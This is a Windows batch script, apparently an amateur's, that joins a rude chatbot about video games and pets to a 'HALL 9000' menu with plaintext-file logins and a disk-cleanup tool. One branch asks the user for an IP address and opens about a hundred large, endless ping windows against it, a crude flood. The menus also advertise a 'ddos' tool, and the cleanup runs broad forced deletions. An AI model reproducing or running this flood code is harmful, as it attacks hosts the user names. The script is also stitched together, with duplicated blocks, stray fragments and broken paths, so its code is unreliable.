echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:loot
echo.
echo I love borderlands 
echo its a wonderfull looting game
echo i love looting games
echo do you like them too?
set /p looter=
if %looter%== yes goto loveyou
if %looter%== no goto understand

:loveyou
echo.
echo I love you dude
echo Its like speaking to myself
echo but we can talk about it later
echo i need to go now
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:understand
echo.
echo why are you playing borderlands then
echo never mind,i dont need to know
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:fucked
echo.
echo you still play that shit %name%?
set /p answer=
if %answer%== yes goto bad4u
if %answer%== no goto good4u

:me2
echo.
echo good,i liket that game too
echo now,whats your favorite csgo team?
set /p topic=
if %topic%== cloud9 goto yay
if %topic%== envyus goto nay

:bad4u
echo.
echo your a pease of shit
echo i dont want to talk to you anymore
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:good4u
echo.
echo fewh,i though you still played it
echo now we can continue our conversation
echo do you have a pet?
set /p pet=
if %pet%== yes goto metwo
if %pet%== no goto whynot

:yay
echo.
echo thats a great one i like it too
echo but i need to go now
echo bye
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:nay
echo.
echo thats great
echo i dont like them though
echo i need to go now
echo bye
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:metwo
echo.
echo thats great i have one too
echo is it a dog or cat or other?
set /p animal=
if %animal%== dog goto dogs
if %animal%== cat goto cats
if %animal%== other goto else

:whynot
echo.
echo whell thats too bad for you
echo i need to go now
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:good
color 3
echo.
echo good,now what is you're name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:mobagame
echo.
echo oh i know that one but i have never played it
echo can you excplain what type of game it is
set /p mobaexplained=
if %mobaexplained%== yes goto mobaexplained1
if %mobaexplained%== no goto explanation2
if %rollplaying1%== shure goto explanation1
if %rollplaying1%== nope goto explanation2

:mobaexplained1
echo.
echo so what is it?
set /p exposed=
if %exposed%==moba goto thanks

:many
echo.
echo Many people play that game in my class
echo but i dont like it
echo just one thing
echo can you excplain what RP means in samp?
set /p rollplaying1=
if %rollplaying1%== shure goto explanation1
if %rollplaying1%== nope goto explanation2
if %rollplaying1%== yes goto explanation1
if %rollplaying1%== nope goto explanation2

:explanation1
echo.
echo so what is it?
set /p rpa=
if %rpa%== rollplaying goto thanks

:explanation2
echo.
echo whell fuck you then
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoob

:thanks
echo.
echo thanks for excplaining but i need to go
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:lier
echo.
echo why are you lying to me
echo i dont whant to talk to you anymore
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoob

:bad
color 4
echo.
echo sorry too hear that.Now what is your name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:Sad 
color 5
echo.
echo veary sorry to hear that.Now what is your name?
set /p name=
echo That's a beautifull name %name%!!!
echo, anyways, time to get serious %name%, what is your favorite videogame
set /p videogame=
if %videogame%==minecraft goto fucked
if %videogame%==csgo goto me2
if %videogame%==samp goto many
if %videogame%==lol goto mobagame
if %videogame%==league of legends goto mobagame
if %videogame%==dota goto mobagame
if %videogame%==borderlands goto loot

:dogs
echo.
echo mine is a dog too
echo i love dogs
echo i think you might too
echo we can talk later,ok?
set /p then=
if %then%== ok goto badboy
if %then%== no goto whelltoobad

:cats
echo. I hate cats
echo.i dont want to talk to you
echo.bye
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:else
echo.
echo whell you can tell me about it latter
echo i need to go now
echo we can talk later,ok?
set /p okthen=
if %okthen%== ok goto badboy
if %okthen%== no goto whelltoobad

:badboy
echo.
echo whait,i changed my mind.
echo we can still talk
echo heres a nother question
echo whats your favorite browser
set /p browser=
if %browser%== googlechrome goto browser
if %browser%== moechoila goto bowser

:browser
echo.
echo thats my favorite one too
echo now,what operating system do you use?
set /p os=
if %os%== windows10 goto os1
if %os%== windows8 goto os2
if %os%== windows7 goto os3
if %os%== ios goto os4
if %os%== linux goto os5
if %os%== android goto os6
if %os%== osx goto os7

:bowser
echo.
echo many people like that one but i dont like it
echo now,what operating system do you use?
set /p os=
if %os%== windows10 goto os1
if %os%== windows8 goto os2
if %os%== windows7 goto os3
if %os%== ios goto os4
if %os%== linux goto os5
if %os%== android goto os6
if %os%== osx goto os7

:os1
echo. 
echo whell i use that one too
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os2
echo. 
echo why are you still using that
echo the windows 10 upgrade was free
echo and windows 10 is way batter than 8
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os3
echo. 
echo whell i used to use that one too
echo but now i upgraded to windows10 wich was free
echo and its way better
echo but it is your dicition
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os4
echo. 
echo i asked for computer not mobile
echo oh and we have a apple user here 
echo yay
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os5
echo. 
echo whell either your a hacker or veary old and dont know anything about computers
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os6
echo. 
echo i asked for computer os not phone
echo oh and btw nice choice i use that one too
echo its veary good
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:os7 
echo. 
echo fucking osx,you use apple software on a computer
echo you do know that windows is the way to go with computers
echo the phone side is diferant
echo oh and btw why do you keep listening to me
echo i never said that you need to
echo just asked you questions
echo never mind that
echo this is the last question
echo i swear
echo do you know Filip Maechoev
set /p finnaly=
if %finnaly%== yes goto finnaly1
if %finnaly%== no goto finnaly2
if %finnaly%== secret goto finnaly3
if %finnaly%== fuckoff goto finnally4
if %finnaly%== matrix goto delete

:finnaly1
echo.
echo really,you know him
echo whell if you do tell him this
echo hes one good of a program maker 
echo hes the one that made me
echo and now for real will be saying goodbye to eachother
echo thanks for having this coversation with me
echo i love you for talking to me
echo for now bye and will see eachother later
set /p goodbyeforever=
if %goodbyeforever%== goodbye goto b2

:finnaly2
echo.
echo too bad, you lied to me!!! TTYL!!!
echo i will talk to you soon right?
set /p what=
if %what%==yes goto delete
if %what%==no goto delete
goto delete

:finnaly3
echo.
echo welcome my master
echo welcome to the matrix
echo where you can have all knowladge that has ever excisted
echo welcome to the deep web
start https://www.torproject.org/download/download
echo bye for now
set /p goodbyeforever=
if %goodbyeforever%== goodbye goto b2 

:finnally4
echo.
echo what is your ip addres?
set /p ipaddress=
echo is this right? %ipaddress%
echo if its right type in yes
set /p answer=
if %answer%== yes goto answeripconfig
if %answer%== no goto finally4

:answeripconfig
echo.
echo thank you for your ip
echo bye
set /p goodbye=
if %goodbye%== bye goto celcius

:celcius
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000
start ping %ipaddress% -t -l 10000

set /p gitrekt=
if %gitrekt%== nooo goto delete

:delete
color 0D
echo.
echo ok,chow!!!
echo {0A}%random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
goto random

:random
color 0A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% 
goto werdy 
:werdy
color 2A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%  %random%
goto random

:b2
echo bye
set /p b21=
if %b21%== bye goto cls
echo
echo
echo
cls

:cls123
cls
pause

:cls
cls

:adminacc
echo.
echo ========================================
echo H A L L 9 0 0 0   P R O    E D I T I O N
echo ========================================
echo administrator privilege active
echo please insert a command number
echo standard mode (1)
echo advanced mode (2)
set /p enter1=ENTER:
if %enter1%== 1 goto hl9k
if %enter1%== 2 goto advancedmd

:advancedmd
title PC Cleanup Utility http://www.youtube.com/user/techki-tv
goto menu2
:menu2
cls
echo --------------------------------------------------------------------------------
echo PC Cleanup Utility
echo --------------------------------------------------------------------------------
echo.
echo Select a tool
echo =============
echo.
echo [1] Delete Internet Cookies
echo [2] Delete Temporary Internet Files
echo [3] Disk Cleanup
echo [4] Disk Defragment
echo [5] Exit
echo.
set /p op=Run:
if %op%==1 goto 1
if %op%==2 goto 2
if %op%==3 goto 3
if %op%==4 goto 4
if %op%==5 goto exit
goto error
:1
cls
echo --------------------------------------------------------------------------------
echo Delete Internet Cookies
echo --------------------------------------------------------------------------------
echo.
echo Deleting Cookies...
ping localhost -n 3 >nul
del /f /q "%userprofile%\Cookies\*.*"
cls
echo --------------------------------------------------------------------------------
echo Delete Internet Cookies
echo --------------------------------------------------------------------------------
echo.
echo Cookies deleted.
echo.
echo Press any key to return to the menu. . .
pause >nul
goto menu2

:2
cls
echo --------------------------------------------------------------------------------
echo Delete Temporary Internet Files
echo --------------------------------------------------------------------------------
echo.
echo Deleting Temporary Files...
ping localhost -n 3 >nul
del /f /q "%userprofile%\AppData\Local\Microsoft\Windows\Temporary Internet Files\*.*"
cls
echo --------------------------------------------------------------------------------
echo Delete Temporary Internet Files
echo --------------------------------------------------------------------------------
echo.
echo Temporary Internet Files deleted.
echo.
echo Press any key to return to the menu. . .
pause >nul
goto menu2

:3
cls
echo --------------------------------------------------------------------------------
echo Disk Cleanup
echo --------------------------------------------------------------------------------
echo.
echo Running Disk Cleanup...
ping localhost -n 3 >nul
if exist "C:\WINDOWS\temp"del /f /q "C:WINDOWS\temp\*.*"
if exist "C:\WINDOWS\tmp" del /f /q "C:\WINDOWS\tmp\*.*"
if exist "C:\tmp" del /f /q "C:\tmp\*.*"
if exist "C:\temp" del /f /q "C:\temp\*.*"
if exist "%temp%" del /f /q "%temp%\*.*"
if exist "%tmp%" del /f /q "%tmp%\*.*"
if not exist "C:\WINDOWS\Users\*.*" goto skip
if exist "C:\WINDOWS\Users\*.zip" del "C:\WINDOWS\Users\*.zip" /f /q
if exist "C:\WINDOWS\Users\*.exe" del "C:\WINDOWS\Users\*.exe" /f /q
if exist "C:\WINDOWS\Users\*.gif" del "C:\WINDOWS\Users\*.gif" /f /q
if exist "C:\WINDOWS\Users\*.jpg" del "C:\WINDOWS\Users\*.jpg" /f /q
if exist "C:\WINDOWS\Users\*.png" del "C:\WINDOWS\Users\*.png" /f /q
if exist "C:\WINDOWS\Users\*.bmp" del "C:\WINDOWS\Users\*.bmp" /f /q
if exist "C:\WINDOWS\Users\*.avi" del "C:\WINDOWS\Users\*.avi" /f /q
if exist "C:\WINDOWS\Users\*.mpg" del "C:\WINDOWS\Users\*.mpg" /f /q
if exist "C:\WINDOWS\Users\*.mpeg" del "C:\WINDOWS\Users\*.mpeg" /f /q
if exist "C:\WINDOWS\Users\*.ra" del "C:\WINDOWS\Users\*.ra" /f /q
if exist "C:\WINDOWS\Users\*.ram" del "C:\WINDOWS\Users\*.ram"/f /q
if exist "C:\WINDOWS\Users\*.mp3" del "C:\WINDOWS\Users\*.mp3" /f /q
if exist "C:\WINDOWS\Users\*.mov" del "C:\WINDOWS\Users\*.mov" /f /q
if exist "C:\WINDOWS\Users\*.qt" del "C:\WINDOWS\Users\*.qt" /f /q
if exist "C:\WINDOWS\Users\*.asf" del "C:\WINDOWS\Users\*.asf" /f /q

:skip
if not exist C:\WINDOWS\Users\Users\*.* goto skippy /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.zip del C:\WINDOWS\Users\Users\*.zip /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.exe del C:\WINDOWS\Users\Users\*.exe /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.gif del C:\WINDOWS\Users\Users\*.gif /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.jpg del C:\WINDOWS\Users\Users\*.jpg /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.png del C:\WINDOWS\Users\Users\*.png /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.bmp del C:\WINDOWS\Users\Users\*.bmp /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.avi del C:\WINDOWS\Users\Users\*.avi /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mpg del C:\WINDOWS\Users\Users\*.mpg /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mpeg del C:\WINDOWS\Users\Users\*.mpeg /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.ra del C:\WINDOWS\Users\Users\*.ra /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.ram del C:\WINDOWS\Users\Users\*.ram /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mp3 del C:\WINDOWS\Users\Users\*.mp3 /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.asf del C:\WINDOWS\Users\Users\*.asf /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.qt del C:\WINDOWS\Users\Users\*.qt /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mov del C:\WINDOWS\Users\Users\*.mov /f /q

:skippy
if exist "C:\WINDOWS\ff*.tmp" del C:\WINDOWS\ff*.tmp /f /q
if exist C:\WINDOWS\ShellIconCache del /f /q "C:\WINDOWS\ShellI~1\*.*"
cls
echo --------------------------------------------------------------------------------
echo Disk Cleanup
echo --------------------------------------------------------------------------------
echo.
echo Disk Cleanup successful!
echo.
pause
goto menu2

:4
cls
echo --------------------------------------------------------------------------------
echo Disk Defragment
echo --------------------------------------------------------------------------------
echo.
echo Defragmenting hard disks...
ping localhost -n 3 >nul
defrag -c -v
cls
echo --------------------------------------------------------------------------------
echo Disk Defragment
echo --------------------------------------------------------------------------------
echo.
echo Disk Defrag successful!
echo.
pause
goto menu2

:error
cls
echo Command not recognized.
ping localhost -n 4 >nul
goto menu2

:exit2
echo Thanks for using PC Cleanup Utility by Ryan
echo all credits reserved to Ryan
ping 127.0.0.1 >nul@echo off

:start1
echo.
cls 
echo Loading.. 
ping localhost -n 2 >nul 
cls 
echo Loading... 
ping localhost -n 2 >nul 
cls 
echo Connected 
echo =======================
echo   W  E  L  C  O  M  E
echo =======================
echo login         (1)
echo register      (2)
echo administrator (3)
echo continue      (4)
echo exit          (5)
set /p userin1=ENTER:
if %userin1%== 1 goto begin1
if %userin1%== 2 goto newuser
if %userin1%== 3 goto login2
if %userin1%== 5 goto exit 
if %userin1%== 4 goto hl9ks
goto start1

:newuser2
set /p userin4=Please insert your Username:
set /p userin5=Please enter your Password:
echo %userin4%>ficou.txt
echo %userin5%>ficop.txt
cls

:login2
set /p userin6=<ficou.txt
set /p userin7=<ficop.txt
set /p userin8=Username:
set /p userin9=Password:
if %userin8%==%userin6% goto password2
if not %userin8%==%userin6% goto begin1
:password2
if %userin9%==%userin7% goto adminacc
if not %userin9%==%userin7% goto begin1

:newuser
set /p userin4=Please insert your Username:
set /p userin5=Please enter your Password:
echo %userin4%>username.txt
echo %userin5%>password.txt
goto begin1

:begin1
set /p userin2=<username.txt
set /p userin3=<password.txt
set /p userin4=Username:
set /p userin5=Password:
if %userin4%==%userin2% goto password
if not %userin4%==%userin2% goto begin1
:password
if %userin5%==%userin3% goto begin2
if not %userin5%==%userin3% goto begin1

:begin2
cls
echo ===============================
echo   WELCOME %userin4% WELCOME
echo ===============================
echo.
echo choose command:
echo continue  (1)
echo customise (2)
echo exit      (3)
set /p cmd=ENTER:
if %cmd%== 1 goto hl9k
if %cmd%== 2 goto colorhl9k
if %cmd%== 3 goto exit
goto begin2

:colorhl9k
pause
echo please instert the number of the color you want
echo blue   (1)
echo green  (2)
echo yellow (3)
echo purple (4)
echo red    (5)
set /p clrchs=ENTER:
if %clrchs%== 1 goto hl9kB
if %clrchs%== 2 goto hl9kG
if %clrchs%== 3 goto hl9kY
if %clrchs%== 4 goto hl9kP
if %clrchs%== 5 goto hl9kR
goto colorhl9k
 
:hl9ks
pause
echo
echo ==================================
echo   H A L L 9 0 0 0   S I M P L E
echo ==================================
echo please insert the command you whant                     
echo you can choose from:       
echo type in "exit" to exit the application
echo type in "back" to go back to login screen
echo (1) music-provides a music player                             
echo (2) skype-opens skype
echo (3) chrome-opens google.com
echo (4) steam-opens steam
echo (5) viber-opens viber
set /p com=command:
if "%com%"=="2" goto skype1
if "%com%"=="3" goto chrome1
if "%com%"=="4" goto steam1
if "%com%"=="5" goto viber1
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9ks
 
:hl9kB
pause
color 03
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:       
echo type in "exit" to exit the application
echo type in "back" to go back to login screen
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam and game launcher
echo (13) viber-opens viber
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9kB

:hl9kG
pause
color 02
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:       
echo type in "exit" to exit the application
echo type in "back" to go back to login screen
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam
echo (13) viber-opens viber
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9kG

:hl9kR
pause
color 04
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:      
echo type in "exit" to exit the application
echo type in "back" to go back to login screen 
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam
echo (13) viber-opens viber
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9kR

:hl9kY
pause
color 06
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:       
echo type in "exit" to exit the application
echo type in "back" to go back to login screen
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam
echo (13) viber-opens viber
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9kY

:hl9kP
pause
color 05
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:     
echo type in "exit" to exit the application
echo type in "back" to go back to login screen  
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam
echo (13) viber-opens viber
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
if "%com%"=="13" goto viber1
if "%com%"=="2" goto menu
if "%com%"=="3" goto ddostool
if "%com%"=="1" goto musicplayer
if "%com%"=="exit" goto exit
if "%com%"=="back" goto start1
goto hl9kP
 
:hl9k
pause
echo
echo ===================
echo   H A L L 9 0 0 0
echo ===================
echo please insert the command you whant                     
echo you can choose from:     
echo type in "exit" to exit the application
echo type in "back" to go back to login screen  
echo (1)  music-provides a music player                             
echo (2)  game-provides an early alpha of a game that we're making.
echo (3)  ddos-provides a ddosing tool
echo (4)  youtube-opens www.youtube.com 
echo (5)  skype-opens skype
echo (6)  chrome-opens google.com
echo (7)  mp3downloader-provides a music downloader
echo (8)  videodownloader-provides a video downloader
echo (9)  starwars-starts star wars episode IV
echo (10) troll-provides a trolling tool
echo (11) conversations-offers three diferant conversations 
echo (12) steam-opens steam
echo (13) viber-opens viber
set /p com=command:
if "%com%"=="4" goto youtube1
if "%com%"=="5" goto skype1
if "%com%"=="6" goto chrome1
if "%com%"=="7" goto mp3juices1
if "%com%"=="8" goto 10youtube
if "%com%"=="9" goto movie1
if "%com%"=="10" goto matrix
if "%com%"=="11" goto hl9
if "%com%"=="12" goto steam1
